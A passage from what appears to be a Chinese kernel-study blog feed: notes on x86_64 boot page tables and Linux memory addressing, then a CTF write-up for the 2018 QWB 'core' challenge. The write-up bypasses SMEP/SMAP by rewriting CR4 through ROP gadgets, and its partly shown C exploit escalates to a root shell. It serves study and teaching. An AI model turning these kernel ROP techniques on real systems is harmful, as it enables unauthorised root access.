DIV_ROUND_UP(_end - _text, PMD_SIZE); i++) &#123;<br><span class="hljs-type">int</span> idx = i + (physaddr &gt;&gt; PMD_SHIFT) % PTRS_PER_PMD;<br>pmd[idx] = pmd_entry + i * PMD_SIZE;<span class="hljs-comment">// 填充物理地址</span><br>&#125;<br><br>pmd = fixup_pointer(level2_kernel_pgt, physaddr);<span class="hljs-comment">// 修正level2_kernel_pgt中的物理地址</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; PTRS_PER_PMD; i++) &#123;<br><span class="hljs-keyword">if</span> (pmd[i] &amp; _PAGE_PRESENT)<br>pmd[i] += load_delta;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 修正phys_base</span><br><span class="hljs-comment"> */</span><br>p = fixup_pointer(&amp;phys_base, physaddr);<br>*p += load_delta - sme_get_me_mask();<br><br><span class="hljs-comment">/* Encrypt the kernel and related (if SME is active) */</span><br>sme_encrypt_kernel(bp);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Return the SME encryption mask (if SME is active) to be used as a</span><br><span class="hljs-comment"> * modifier for the initial pgdir entry programmed into CR3.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> sme_get_me_mask();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="64位页表"><a href="#64位页表" class="headerlink" title="64位页表"></a>64位页表</h3><p>x86_64使用4级页表：</p><ul><li>全局页目录</li><li>上层页目录</li><li>中间页目录</li><li>页表项</li></ul><p>地址的第1-16位（高到低）用于区分用户态和内核态</p><ul><li>全0为用户空间</li><li>全1为内核空间</li></ul><p>分页的具体位数如下：</p><ul><li>1-16：不使用</li><li>17-25：全局页目录（pgd）</li><li>26-34：上层页目录（pud）</li><li>35-43：中间页目录（pmd）</li><li>44-52：页表项</li><li>53-64：页内偏移</li></ul><p>以下源码只有三级页表，页大小为0x200000（PAE）</p><p>__startup_64中使用的页表相关定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_TABLE_NOENC(_PAGE_PRESENT | _PAGE_RW | _PAGE_USER |\</span><br><span class="hljs-meta"> _PAGE_ACCESSED | _PAGE_DIRTY)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _KERNPG_TABLE_NOENC(_PAGE_PRESENT | _PAGE_RW |\</span><br><span class="hljs-meta"> _PAGE_ACCESSED | _PAGE_DIRTY)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMDS(START, PERM, COUNT)\</span><br><span class="hljs-meta">i = 0 ;\</span><br><span class="hljs-meta">.rept (COUNT) ;\</span><br><span class="hljs-meta">.quad(START) + (i &lt;&lt; PMD_SHIFT) + (PERM) ;\</span><br><span class="hljs-meta">i = i + 1 ;\</span><br><span class="hljs-meta">.endr</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __PAGE_KERNEL_LARGE_EXEC(__PAGE_KERNEL_EXEC | _PAGE_PSE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KERNEL_IMAGE_SIZE(512 * 1024 * 1024)</span><br><br>L3_START_KERNEL = pud_index(__START_KERNEL_map)<br>    <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pud_index(x)(((x) &gt;&gt; PUD_SHIFT) &amp; (PTRS_PER_PUD-1))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGDIR_SHIFT39</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTRS_PER_PGD512</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 3rd level page</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_SHIFT30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTRS_PER_PUD512</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * PMD_SHIFT determines the size of the area a middle-level</span><br><span class="hljs-comment"> * page table can map</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_SHIFT21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTRS_PER_PMD512</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/*<br> * 每个页表使用9位，共有1&lt;&lt;9=512个表项<br> */<br> <br>/*<br> * 前511项都不使用<br> * 第512项填充level3_kernel_pgt的物理地址和标志<br> * 内核空间的映射基址是0xffffffff80000000，第17-25位都为1<br> */<br>NEXT_PGD_PAGE(early_top_pgt)<br>.fill511,8,0<br>.quadlevel3_kernel_pgt - __START_KERNEL_map + _PAGE_TABLE_NOENC<br>.fillPTI_USER_PGD_FILL,8,0<br><br>NEXT_PAGE(early_dynamic_pgts)<br>.fill512*EARLY_DYNAMIC_PAGE_TABLES,8,0<br><br>/*<br> * 前510(L3_START_KERNEL)项不使用<br> * 0xffffffff80000000的第26-34位为0b111111110（内核空间），填充level2_kernel_pgt的物理地址和标志<br> * 0xffffffffc0000000的第26-34位为0b111111111（用户空间可使用的vsyscall），填充level2_fixmap_pgt的物理地址和标志<br> */<br>NEXT_PAGE(level3_kernel_pgt)<br>.fillL3_START_KERNEL,8,0<br>.quadlevel2_kernel_pgt - __START_KERNEL_map + _KERNPG_TABLE_NOENC<br>.quadlevel2_fixmap_pgt - __START_KERNEL_map + _PAGE_TABLE_NOENC<br><br>/*<br> * 前256项填充物理地址 : 0x200000,0x400000,0x800000……<br> * 内核使用2MB大小的页，所以第44-64位用于页内偏移<br> * 内核空间的地址范围是0xffffffff80000000-0xffffffff9fffffff，第35-43位最大值为255，只使用前256项<br> */<br>NEXT_PAGE(level2_kernel_pgt)<br>PMDS(0, __PAGE_KERNEL_LARGE_EXEC,<br>KERNEL_IMAGE_SIZE/PMD_SIZE)<br><br>/*<br> * 前506项不使用<br> * vsyscalls地址为0xffffffffff600000-0xffffffffff600fff，第35-43位为507，只使用第507项，填充level1_fixmap_pgt<br> */<br>NEXT_PAGE(level2_fixmap_pgt)<br>.fill506,8,0<br>.quadlevel1_fixmap_pgt - __START_KERNEL_map + _PAGE_TABLE_NOENC<br>/* 8MB reserved for vsyscalls + a 2MB hole = 4 + 1 entries */<br>.fill5,8,0<br><br>/*<br> * 先都填充0，不分配物理页<br> * 用户空间使用4KB大小的页，所以第44-52位用于页表项<br> */<br>NEXT_PAGE(level1_fixmap_pgt)<br>.fill512,8,0<br><br>/*<br> * 物理地址基址，先填充0<br> */<br>ENTRY(phys_base)<br>/* This must match the first entry in level2_kernel_pgt */<br>.quad   0x0000000000000000<br>EXPORT_SYMBOL(phys_base)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Source Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source code</tag>
      
      <tag>boot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LINUX内存管理-内核寻址</title>
    <link href="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/"/>
    <url>/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>理论(・∀・(・∀・(・∀・*)</p><p>主要参考书目：《深入理解LINUX内核（第三版）》</p><p>ps：理论相关说明以32位为例</p><span id="more"></span><h1 id="内核寻址"><a href="#内核寻址" class="headerlink" title="内核寻址"></a>内核寻址</h1><p>内存寻址过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">逻辑地址-&gt;[分段单元]-&gt;线性地址-&gt;[分页单元]-&gt;逻辑地址<br></code></pre></td></tr></table></figure><h2 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h2><p>先放一张图说明分段单元将逻辑地址（16位段选择符：32位偏移）转化为线性地址的过程</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/%E6%AE%B5.png" class title="段"><p>段选择符结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">15</span>            <span class="hljs-number">3</span>  <span class="hljs-number">2</span>  <span class="hljs-number">0</span><br>+-------------+--+----+<br>|    index    |TI|RPL |<br>+-------------+--+----+<br></code></pre></td></tr></table></figure><ul><li>index：GDT或LDT中段描述符的入口</li><li>TI：1表示段描述符在LDT中，0表示段描述符在GDT中</li><li>RPL：请求者特权级，0（内核态）或3（用户态）</li></ul><p>段描述符结构：</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6.png" class title="段描述符"><ul><li>Base：段首字节的线性地址</li><li>G：粒度标记，0则段大小一字节为单位，1则以4086字节为单位</li><li>Limit：段中最后一个内存单元的偏移量</li><li>S：系统标志，0表示系统段（如LDT）</li><li>Type：段类型和存取权限（代码段，数据段，任务状态段）</li><li>DPL：特权级</li><li>P：0表示不在主存中（Linux总是将P置1，因为不把整个段换到磁盘中）</li><li>D或B：数据段或代码段</li><li>AVL：略</li></ul><h3 id="Linux中的分段"><a href="#Linux中的分段" class="headerlink" title="Linux中的分段"></a>Linux中的分段</h3><p>80x86结构使用以下分段：</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/linux%E5%88%86%E6%AE%B5.png" class title="linux分段"><p>相应的段选择符由__USER_CS、__KERNEL_CS、__USER_DS、__KERNEL_DS定义，寻址时只需要把相应的宏装入cs段寄存器或者ds段寄存器就行</p><p>所有段都从0开始，说明Linux中逻辑地址和线性地址是一样的</p><p>实际寻址时只需要使用cs或者ds寄存器中的段选择符+地址偏移就可以进行，所以我们日常看到的地址实际上都是逻辑地址中的偏移</p><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>cr0寄存器中的PG标志表示分页是否开启，PG&#x3D;0时线性地址直接被解释为物理地址</p><h3 id="一些分页机制"><a href="#一些分页机制" class="headerlink" title="一些分页机制"></a>一些分页机制</h3><h4 id="常规分页"><a href="#常规分页" class="headerlink" title="常规分页"></a>常规分页</h4><p>分页单元将线性地址转化为物理地址的过程如下：</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/%E5%88%86%E9%A1%B5.png" class title="分页"><p>10+10+12&#x3D;32</p><p>页目录项和页表项结构：</p><ul><li>Present：页是否在主存中</li><li>Field：页框物理地址高20位（一页4KB，页框基地址0x1000对齐）</li><li>Accessed：分页单元寻址时使用，当页被交换出去时被操作系统使用</li><li>Dirty：页被修改</li><li>Read&#x2F;Write：存取权限</li><li>User&#x2F;Supervisor：特权级</li><li>PCD和PWT标志：控制硬件高速缓存处理页或页表的方式</li><li>Page Size：应用于页目录项，置1表示页目录指向2MB或4MB的页框</li><li>Global：应用于页表项，防止常用页被从TLB中刷新出去，cr4的PGE标志置1时使用</li></ul><h4 id="扩展分页"><a href="#扩展分页" class="headerlink" title="扩展分页"></a>扩展分页</h4><p>页框大小为4MB而不是4KB</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/%E6%89%A9%E5%B1%95%E5%88%86%E9%A1%B5.png" class title="扩展分页"><p>10+22&#x3D;32</p><p>目录项和正常分页基本相同，除了：</p><ul><li>Page Size必须设置</li><li>32位物理地址（offset）只有最高10位有意义，因为4MB的页大小0x400000对齐</li></ul><p>设置cr4寄存器的PSE标志能使扩展分页和常规分页共存</p><h4 id="物理地址扩展（PAE）分页机制"><a href="#物理地址扩展（PAE）分页机制" class="headerlink" title="物理地址扩展（PAE）分页机制"></a>物理地址扩展（PAE）分页机制</h4><p>32位线性地址可以使用4GB的物理地址，为了使用增加的物理地址（64GB）产生了PAE</p><p>设置cr4的PAE标志激活PAE，页目录项中的Page Size标志启用大尺寸页（启用PAE时为2MB）</p><ul><li>引入PDPT，改变cr3中的值</li><li>同一线性地址可能对应不同物理地址</li></ul><h3 id="Linux中的分页"><a href="#Linux中的分页" class="headerlink" title="Linux中的分页"></a>Linux中的分页</h3><p>32位64位通用</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/linux%E5%88%86%E9%A1%B5.png" class title="linux分页"><ul><li>32位：页上级目录和页中间目录全为0</li><li>启用PAE的32位：三级页表，页全局目录对应PDPT，取消页上级目录</li></ul><h3 id="一些加快分页的硬件"><a href="#一些加快分页的硬件" class="headerlink" title="一些加快分页的硬件"></a>一些加快分页的硬件</h3><ul><li>硬件高速缓存</li><li>转换后援缓冲器（TLB）</li></ul>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Source Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>memory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel ROP ret2usr</title>
    <link href="/2023/08/04/kernel-rop-ret2usr/"/>
    <url>/2023/08/04/kernel-rop-ret2usr/</url>
    
    <content type="html"><![CDATA[<p>针对SMAP&#x2F;SMEP绕过的ret2usr</p><span id="more"></span><h1 id="ret2usr相关保护和绕过"><a href="#ret2usr相关保护和绕过" class="headerlink" title="ret2usr相关保护和绕过"></a>ret2usr相关保护和绕过</h1><h2 id="SMAP-x2F-SMEP"><a href="#SMAP-x2F-SMEP" class="headerlink" title="SMAP&#x2F;SMEP"></a>SMAP&#x2F;SMEP</h2><ul><li>SMAP：管理模式访问保护</li><li>SMEP：管理模式执行保护</li></ul><p>阻止内核空间直接访问&#x2F;执行用户空间数据&#x2F;代码</p><p>绕过方法：</p><ul><li><p>ret2dir（详情见ret2dir）</p></li><li><p>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），可以利用ROP更改CR4寄存器的值（放一张典中典的图）</p><img src="/2023/08/04/kernel-rop-ret2usr/dzd1.png" class title="dzd1"></li></ul><h2 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h2><ul><li><p>内核空间和用户空间使用不同的页表集</p></li><li><p>两张页表中都有对用户空间内存的完整映射，但用户空间页表只有部分内核空间内存的映射（再放一张典中典的图）</p><img src="/2023/08/04/kernel-rop-ret2usr/dzd2.png" class title="dzd2"></li><li><p>内核空间页表中用户空间代码无执行权限，ret2usr彻底寄了</p></li></ul><h2 id="例题：依然是典中典强网杯2018-core"><a href="#例题：依然是典中典强网杯2018-core" class="headerlink" title="例题：依然是典中典强网杯2018 - core"></a>例题：依然是典中典强网杯2018 - core</h2><p>一个小（da）插曲：ropper和ROPgadget甚至IDA找的gadget位置和实际执行的位置 不一样，我tm花了昨天一晚上+今天一早上的时间解决这个问题结果你告诉我题目的vmlinux有问题（谢谢Lantern大佬的博客，救人一命胜造七级浮屠）？？？？？用vmlinux-to-elf重新从bzImage中提vmlinux就没事了，淦</p><h3 id="SMAP-x2F-SMEP绕过的ret2usr"><a href="#SMAP-x2F-SMEP绕过的ret2usr" class="headerlink" title="SMAP&#x2F;SMEP绕过的ret2usr"></a>SMAP&#x2F;SMEP绕过的ret2usr</h3><p>更改后的start.sh脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 256M \<br>-cpu qemu64-v1,+smep,+smap \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \<br>--nographic<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 #\<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-S -gdb tcp::1234</span><br></code></pre></td></tr></table></figure><p>或者单独关闭KPTI</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 256M \<br>-cpu kvm64,+smep,+smap \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr nopti&quot; \<br>--nographic<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 #\<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-S -gdb tcp::1234</span><br></code></pre></td></tr></table></figure><p>假装不知道（老晁上身( •̀ ω •́ )✧）运行一下之前的exploit</p><img src="/2023/08/04/kernel-rop-ret2usr/error.png" class title="error"><p>报错了捏~(￣▽￣)~*</p><p>更改一下exploit，可以利用与运算将cr4的SMAP和SMEP两位清零，也可以直接给cr4赋值0x6f0</p><p>这次的exploit直接利用swapgs_restore_regs_and_return_to_usermode函数返回用户态</p><p>ropper和ROPgadget的gadget全部提取指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary ./vmlinux &gt; ./rop_ROP.txt<br>ropper -f ./vmlinux --nocolor &gt; ./rop_ropper.txt<br></code></pre></td></tr></table></figure><p>与操作更改cr4的exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RAX_CR4_ADD_RSP_8_POP_RBX_RET 0xFFFFFFFF8106669C</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AND_RAX_RDI_RET 0xffffffff8102b45b</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> *commit_creds = <span class="hljs-literal">NULL</span>, *prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><br>    <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_privilige</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *(*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);        <br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. &quot;</span><br>         <span class="hljs-string">&quot;Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889b</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889c</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889a</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    save_status();<br><br>    <span class="hljs-type">int</span> fd;<br>    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <br>    FILE *sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-type">char</span> type[<span class="hljs-number">0x10</span>], buf[<span class="hljs-number">0x50</span>];<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span 